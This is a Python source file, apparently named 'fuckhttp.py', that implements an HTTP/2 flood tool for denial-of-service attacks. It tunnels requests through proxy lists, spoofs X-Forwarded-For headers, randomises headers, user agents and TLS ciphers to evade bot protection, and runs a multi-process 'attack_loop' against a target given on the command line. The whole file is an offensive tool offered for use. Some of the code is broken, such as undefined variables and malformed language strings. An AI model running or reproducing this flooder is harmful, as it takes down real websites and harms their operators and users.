    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
 ]

cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
]

language_header = [
    'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl?q=0.9',
    'sq-AL,sq?q=0.9',
    'sr-Cyrl-RS,sr?q=0.9',
    'sr-Latn-RS,sr?q=0.9',
    'sv-SE,sv?q=0.9',
    'sw-KE,sw?q=0.9',
    'ta-IN,ta?q=0.9',
    'te-IN,te?q=0.9',
    'th-TH,th?q=0.9',
    'tr-TR,tr?q=0.9',
    'uk-UA,uk?q=0.9',
    'ur-PK,ur?q=0.9',
    'uz-Latn-UZ,uz?q=0.9',
    'vi-VN,vi?q=0.9',
    'zh-CN,zh?q=0.9',
    'zh-HK,zh?q=0.9',
    'zh-TW,zh?q=0.9',
    'am-ET,am?q=0.8',
    'as-IN,as?q=0.8',
    'az-Cyrl-AZ,az?q=0.8',
    'bn-BD,bn?q=0.8',
    'bs-Cyrl-BA,bs?q=0.8',
    'bs-Latn-BA,bs?q=0.8',
    'dz-BT,dz?q=0.8',
    'fil-PH,fil?q=0.8',
    'fr-CA,fr?q=0.8',
    'fr-CH,fr?q=0.8',
    'fr-BE,fr?q=0.8',
    'fr-LU,fr?q=0.8',
    'gsw-CH,gsw?q=0.8',
    'ha-Latn-NG,ha?q=0.8',
    'hr-BA,hr?q=0.8',
    'ig-NG,ig?q=0.8',
    'ii-CN,ii?q=0.8',
    'is-IS,is?q=0.8',
    'jv-Latn-ID,jv?q=0.8',
    'ka-GE,ka?q=0.8',
    'kkj-CM,kkj?q=0.8',
    'kl-GL,kl?q=0.8',
    'km-KH,km?q=0.8',
    'kok-IN,kok?q=0.8',
    'ks-Arab-IN,ks?q=0.8',
    'lb-LU,lb?q=0.8',
    'ln-CG,ln?q=0.8',
    'mn-Mong-CN,mn?q=0.8',
    'mr-MN,mr?q=0.8',
    'ms-BN,ms?q=0.8',
    'mt-MT,mt?q=0.8',
    'mua-CM,mua?q=0.8',
    'nds-DE,nds?q=0.8',
    'ne-IN,ne?q=0.8',
    'nso-ZA,nso?q=0.8',
    'oc-FR,oc?q=0.8',
    'pa-Arab-PK,pa?q=0.8',
    'ps-AF,ps?q=0.8',
    'quz-BO,quz?q=0.8',
    'quz-EC,quz?q=0.8',
    'quz-PE,quz?q=0.8',
    'rm-CH,rm?q=0.8',
    'rw-RW,rw?q=0.8',
    'sd-Arab-PK,sd?q=0.8',
    'se-NO,se?q=0.8',
    'si-LK,si?q=0.8',
    'smn-FI,smn?q=0.8',
    'sms-FI,sms?q=0.8',
    'syr-SY,syr?q=0.8',
    'tg-Cyrl-TJ,tg?q=0.8',
    'ti-ER,ti?q=0.8',
    'tk-TM,tk?q=0.8',
    'tn-ZA,tn?q=0.8',
    'ug-CN,ug?q=0.8',
    'uz-Cyrl-UZ,uz?q=0.8',
    've-ZA,ve?q=0.8',
    'wo-SN,wo?q=0.8',
    'xh-ZA,xh?q=0.8',
    'yo-NG,yo?q=0.8',
    'zgh-MA,zgh?q=0.8',
    'zu-ZA,zu?q=0.8',
    'ko-KR',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8',
]

fetch_site = [
    "same-origin",
    "same-site",
    "cross-site",
    "none"
]

fetch_mode = [
    "navigate",
    "same-origin",
    "no-cors",
    "cors",
]

fetch_dest = [
    "document",
    "sharedworker",
    "subresource",
    "unknown",
    "worker",
]

cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
]
cipper = cplist[math.floor(math.floor(random.random() * len(cplist)))]

# Set maximum event listeners (Not applicable in Python, so we simply pass)
# Adjusting for events in Python is omitted.
# Set defaultMaxListeners for events - not needed

sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512",
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
]
SignalsList = ":".join(sigalgs)
ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448"

# Secure Options: using available ssl options in Python (some may not be available)
secureOptions = ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | getattr(ssl, "OP_NO_TLSv1_3", 0) | getattr(ssl, "OP_LEGACY_SERVER_CONNECT", 0) | getattr(ssl, "OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION", 0) | getattr(ssl, "OP_CIPHER_SERVER_PREFERENCE", 0) | getattr(ssl, "OP_PKCS1_CHECK_1", 0) | getattr(ssl, "OP_PKCS1_CHECK_2", 0) | ssl.OP_SINGLE_DH_USE | ssl.OP_SINGLE_ECDH_USE | getattr(ssl, "OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION", 0)
secureProtocol = ssl.PROTOCOL_TLS
headersGlobal = {}

secureContextOptions = {
    "ciphers": ciphers,
    "sigalgs": SignalsList,
    "honorCipherOrder": True,
    "secureOptions": secureOptions,
    "secureProtocol": secureProtocol
}

secureContext = ssl.SSLContext(secureProtocol)
secureContext.options |= secureOptions
secureContext.set_ciphers(ciphers)

# Command line arguments check
if len(sys.argv) < 5:
    print("Usage: fuckhttp.py host time req thread [proxy.txt]")
    sys.exit()

args = {
    "target": sys.argv[1],
    "time": int(sys.argv[2]),
    "Rate": int(sys.argv[3]),
    "threads": int(sys.argv[4]),
    "proxyFile": sys.argv[5] if len(sys.argv) > 5 else None
}

# Proxy loading with fallback
def load_proxies(proxy_file=None):
    if not proxy_file:
        return []
    try:
        with open(proxy_file, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Warning: Could not load proxies from {proxy_file}: {e}")
        return []

proxies = load_proxies(args["proxyFile"])
parsedTarget = urllib.parse.urlparse(args["target"])

MAX_RAM_PERCENTAGE = 80
RESTART_DELAY = 1.0  # in seconds

# NetSocket class with HTTP method
class NetSocket:
    def __init__(self):
        pass

    def HTTP(self, options, callback):
        # Split the address into host and port parts
        parsedAddr = options["address"].split(":")
        addrHost = parsedAddr[0]
        payload = "CONNECT " + options["address"] + ":443 HTTP/1.1\r\nHost: " + options["address"] + ":443\r\nConnection: Keep-Alive\r\n\r\n"  # Keep Alive
        buffer = payload.encode()
        try:
            connection = socket.create_connection((options["host"], options["port"]))
        except Exception as e:
            callback(None, "error: cannot connect to proxy")
            return
        # Set timeout and socket options
        connection.settimeout(options["timeout"] * 600)
        connection.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            connection.sendall(buffer)
        except Exception as e:
            connection.close()
            callback(None, "error: sending CONNECT payload")
            return

        try:
            chunk = connection.recv(4096)
            response = chunk.decode("utf-8", errors="ignore")
            isAlive = ("HTTP/1.1 200" in response)
            if not isAlive:
                connection.close()
                callback(None, "error: invalid response from proxy server")
                return
            callback(connection, None)
        except Exception as e:
            connection.close()
            callback(None, "error: receiving response from proxy server")
            return

# Utility functions
def getRandomInt(minVal, maxVal):
    return random.randint(minVal, maxVal)

def getRandomValue(arr):
    randomIndex = math.floor(random.random() * len(arr))
    return arr[randomIndex]

def randstra(length):
    characters = "0123456789"
    result = ""
    for i in range(length):
        result += random.choice(characters)
    return result

def randomIntn(minVal, maxVal):
    return random.randint(minVal, maxVal)

def randomElement(elements):
    return elements[randomIntn(0, len(elements)-1)]

def randstrs(length):
    characters = "0123456789"
    charactersLength = len(characters)
    randomBytes = os.urandom(length)
    result = ""
    for i in range(length):
        randomIndex = randomBytes[i] % charactersLength
        result += characters[randomIndex]
    return result

randstrsValue = randstrs(10)

# NetSocket instance
Socker = NetSocket()

def getRandomString(length):
    characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    result = ""
    for i in range(length):
        result += random.choice(characters)
    return result

def generateRandomString(minLength, maxLength):
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    length = random.randint(minLength, maxLength)
    randomStringArray = [random.choice(characters) for _ in range(length)]
    return "".join(randomStringArray)

def runFlooder():
    # Choose a random proxy address
    proxyAddr = randomElement(proxies)
    parsedProxy = proxyAddr.split(":")
    parsedPort = "443" if parsedTarget.scheme == "https" else "80"
    nm = [
        "110.0.0.0",
        "111.0.0.0",
        "112.0.0.0",
        "113.0.0.0",
        "114.0.0.0",
        "115.0.0.0",
        "116.0.0.0",
        "117.0.0.0",
        "118.0.0.0",
        "119.0.0.0",
    ]
    nmx = [
        "120.0",
        "119.0",
        "118.0",
        "117.0",
        "116.0",
        "115.0",
        "114.0",
        "113.0",
        "112.0",
        "111.0",
    ]
    nmx1 = [
        "105.0.0.0",
        "104.0.0.0",
        "103.0.0.0",
        "102.0.0.0",
        "101.0.0.0",
        "100.0.0.0",
        "99.0.0.0",
        "98.0.0.0",
        "97.0.0.0",
    ]
    sysos = [
        "Windows 1.01",
        "Windows 1.02",
        "Windows 1.03",
        "Windows 1.04",
        "Windows 2.01",
        "Windows 3.0",
        "Windows NT 3.1",
        "Windows NT 3.5",
        "Windows 95",
        "Windows 98",
        "Windows 2006",
        "Windows NT 4.0",
        "Windows 95 Edition",
        "Windows 98 Edition",
        "Windows Me",
        "Windows Business",
        "Windows XP",
        "Windows 7",
        "Windows 8",
        "Windows 10 version 1507",
        "Windows 10 version 1511",
        "Windows 10 version 1607",
        "Windows 10 version 1703",
    ]
    winarch = [
        "x86-16",
        "x86-16, IA32",
        "IA-32",
        "IA-32, Alpha, MIPS",
        "IA-32, Alpha, MIPS, PowerPC",
        "Itanium",
        "x86_64",
        "IA-32, x86-64",
        "IA-32, x86-64, ARM64",
        "x86-64, ARM64",
        "ARMv4, MIPS, SH-3",
        "ARMv4",
        "ARMv5",
        "ARMv7",
        "IA-32, x86-64, Itanium",
        "IA-32, x86-64, Itanium",
        "x86-64, Itanium",
    ]
    winch = [
        "2012 R2",
        "2019 R2",
        "2012 R2 Datacenter",
        "Server Blue",
        "Longhorn Server",
        "Whistler Server",
        "Shell Release",
        "Daytona",
        "Razzle",
        "HPC 2008",
    ]
    nm1 = randomElement(nm)
    nm2 = randomElement(sysos)
    nm3 = randomElement(winarch)
    nm4 = randomElement(nmx)
    nm5 = randomElement(winch)
    nm6 = randomElement(nmx1)
    rd = [
        "221988",
        "1287172",
        "87238723",
        "8737283",
        "8238232",
        "63535464",
        "121212",
    ]
    kha = randomElement(rd)

    encoding_header = [
        'gzip, deflate, br',
        'compress, gzip',
        'deflate, gzip',
        'gzip, identity'
    ]

    def randstrr(length):
        characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-"
        result = ""
        for i in range(length):
            result += random.choice(characters)
        return result

    def randstr(length):
        characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        result = ""
        for i in range(length):
            result += random.choice(characters)
        return result

    def generateRandomStringLocal(minLength, maxLength):
        return generateRandomString(minLength, maxLength)

    val = { "NEl": json.dumps({ 
            "report_to": "cf-nel" if random.random() < 0.5 else "default",
            "max-age": 604800 if random.random() < 0.5 else 2561000,
            "include_subdomains": True if random.random() < 0.5 else False
            })
         }

    rateHeaders = [
        {"accept": accept_header[math.floor(random.random() * len(accept_header))]},
        {"Access-Control-Request-Method": "GET"},
        {"accept-language": language_header[math.floor(random.random() * len(language_header))]},
        {"origin": "https://" + parsedTarget.netloc},
        {"source-ip": randstr(5)},
        {"data-return": "false"},
        {"X-Forwarded-For": parsedProxy[0]},
        {"NEL": val},
        {"dnt": "1"},
        {"A-IM": "Feed"},
        {'Accept-Range': 'bytes' if random.random() < 0.5 else 'none'},
        {'Delta-Base': '12340001'},
        {"te": "trailers"},
        {"accept-language": language_header[math.floor(random.random() * len(language_header))]},
    ]
    headers = {
        ":authority": parsedTarget.netloc,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomStringLocal(10,25),
        ":method": "GET",
        "pragma": "no-cache",
        "upgrade-insecure-requests": "1",
        "accept-encoding": encoding_header[math.floor(random.random() * len(encoding_header))],
        "cache-control": cache_header[math.floor(random.random() * len(cache_header))],
        "sec-fetch-mode": fetch_mode[math.floor(random.random() * len(fetch_mode))],
        "sec-fetch-site": fetch_site[math.floor(random.random() * len(fetch_site))],
        "sec-fetch-dest": fetch_dest[math.floor(random.random() * len(fetch_dest))],
        "user-agent": "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha + " " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
    }
    proxyOptions = {
        "host": parsedProxy[0],
        "port": int(parsedProxy[1]),
        "address": parsedTarget.netloc + ":443",
        "timeout": 10
    }
    # Use the NetSocket HTTP method
    def proxyCallback(connection, error):
        if error:
            return
        try:
            connection.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass

        settings = {
            "enablePush": False,
            "initialWindowSize": 15564991,
        }

        tlsOptions = {
            "port": parsedPort,
            "secure": True,
            "ALPNProtocols": ["h2"],
            "ciphers": cipper,
            "sigalgs": sigalgs,
            "requestCert": True,
            "socket": connection,
            "ecdhCurve": ecdhCurve,
            "honorCipherOrder": False,
            "rejectUnauthorized": False,
            "secureOptions": secureOptions,
            "secureContext": secureContext,
            "host": parsedTarget.hostname,
            "servername": parsedTarget.hostname,
            "secureProtocol": secureProtocol
        }
        try:
            # Wrap existing proxy connection into TLS connection
            tlsConn = secureContext.wrap_socket(connection, server_hostname=parsedTarget.hostname)
            tlsConn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            tlsConn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            tlsConn.settimeout(10)
            # Create an HTTP/2 connection over TLS
            client = H2Connection(client_side=True, header_encoding='utf-8')
            client.initiate_connection()
            tlsConn.sendall(client.data_to_send())
        except Exception:
            try:
                tlsConn.close()
            except Exception:
                pass
            connection.close()
            return

        def attack_loop():
            while True:
                for i in range(args["Rate"]):
                    try:
                        dynHeaders = headers.copy()
                        extra = randomElement(rateHeaders)
                        dynHeaders.update(extra)
                        stream_id = client.get_next_available_stream_id()
                        client.send_headers(stream_id, [(k, v) for k, v in dynHeaders.items()], end_stream=True)
                        data_to_send = client.data_to_send()
                        tlsConn.sendall(data_to_send)
                        # Read response (non-blocking)
                        try:
                            r = tlsConn.recv(65535)
                        except Exception:
                            r = b""
                        # Close the stream simulated by doing nothing
                    except Exception:
                        pass
                time.sleep(0.3)
        attack_thread = threading.Thread(target=attack_loop, daemon=True)
        attack_thread.start()

        def close_handlers():
            try:
                tlsConn.close()
            except Exception:
                pass
            try:
                connection.close()
            except Exception:
                pass

        # Setup socket error handling via a background thread
        def monitor():
            while True:
                try:
                    rlist, _, _ = select.select([tlsConn], [], [], 1)
                    if rlist:
                        data = tlsConn.recv(1024)
                        if not data:
                            close_handlers()
                            break
                except Exception:
                    close_handlers()
                    break
        monitor_thread = threading.Thread(target=monitor, daemon=True)
        monitor_thread.start()
    Socker.HTTP(proxyOptions, proxyCallback)

# StopScript function to exit the process
def StopScript():
    sys.exit(1)

# Master process: spawns worker processes and monitors RAM usage
def master_process():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{fuck}
$$$$$$$$\ $$\   $$\  $$$$$$\  $$\   $$\ $$\   $$\ $$$$$$$$\ $$$$$$$$\ $$$$$$$\  
$$  _____|$$ |  $$ |$$  __$$\ $$ | $$  |$$ |  $$ |\__$$  __|\__$$  __|$$  __$$\ 
$$ |      $$ |  $$ |$$ /  \__|$$ |$$  / $$ |  $$ |   $$ |      $$ |   $$ |  $$ |
$$$$$\    $$ |  $$ |$$ |      $$$$$  /  $$$$$$$$ |   $$ |      $$ |   $$$$$$$  |
$$  __|   $$ |  $$ |$$ |      $$  $$<   $$  __$$ |   $$ |      $$ |   $$  ____/ 
$$ |      $$ |  $$ |$$ |  $$\ $$ |\$$\  $$ |  $$ |   $$ |      $$ |   $$ |      
$$ |      \$$$$$$  |\$$$$$$  |$$ | \$$\ $$ |  $$ |   $$ |      $$ |   $$ |      
\__|       \______/  \______/ \__|  \__|\__|  \__|   \__|      \__|   \__|      
       {clear}                                                                         
 ''')                                                                               
                                                                                
    print((Fore.BLUE + "FUCKHTTP BY VinNotSepuh"))
    print((Fore.RED + "Attack Successfully Sent"))
    print((Fore.WHITE + "--------------------------------------------"))
    print((Fore.YELLOW + " - Target: ") + sys.argv[1])
    print((Fore.YELLOW + " - Time: ") + sys.argv[2])
    print((Fore.YELLOW + " - Rate: ") + sys.argv[3])
    print((Fore.YELLOW + " - Thread: ") + sys.argv[4])
    print((Fore.YELLOW + " - ProxyFile: ") + sys.argv[5])
    print((Fore.WHITE + "--------------------------------------------"))
    print((Fore.YELLOW + "FUCKHTTP 1/1 CUSTOM High RQ/S"))

    workers = []

    def restartScript():
        for worker in workers:
            try:
                worker.terminate()
            except Exception:
                pass
        print("[>] Restarting the script", RESTART_DELAY, "ms...")
        time.sleep(RESTART_DELAY)
        del workers[:]
        for _ in range(args["threads"]):
            p = multiprocessing.Process(target=worker_process)
            p.start()
            workers.append(p)

    def handleRAMUsage():
        try:
            totalRAM = psutil.virtual_memory().total
            usedRAM = totalRAM - psutil.virtual_memory().available
            ramPercentage = (usedRAM / totalRAM) * 100
            if ramPercentage >= MAX_RAM_PERCENTAGE:
                print("[!] Maximum RAM usage:", "{:.2f}".format(ramPercentage), "%")
                restartScript()
        except Exception:
            pass

    def monitor_ram():
        while True:
            handleRAMUsage()
            time.sleep(5)
    monitor_thread = threading.Thread(target=monitor_ram, daemon=True)
    monitor_thread.start()

    for _ in range(args["threads"]):
        p = multiprocessing.Process(target=worker_process)
        p.start()
        workers.append(p)
    # Wait for stop time then exit
    time.sleep(args["time"])
    StopScript()

# Worker process: repeatedly calls runFlooder
def worker_process():
    # Periodically run the flooder function
    while True:
        runFlooder()
        time.sleep(0.1)

# Setup uncaught exception and unhandled rejection handlers (simulate by sys.excepthook)
def handle_exception(exc_type, exc_value, exc_traceback):
    pass
sys.excepthook = handle_exception

# Main entry point
if __name__ == "__main__":
    # Schedule StopScript after args["time"] seconds in a separate thread
    stop_timer = threading.Timer(args["time"], StopScript)
    stop_timer.start()
    # Determine master vs worker by checking if current process is the main process
    # In this design, the main process acts as master
    master_process()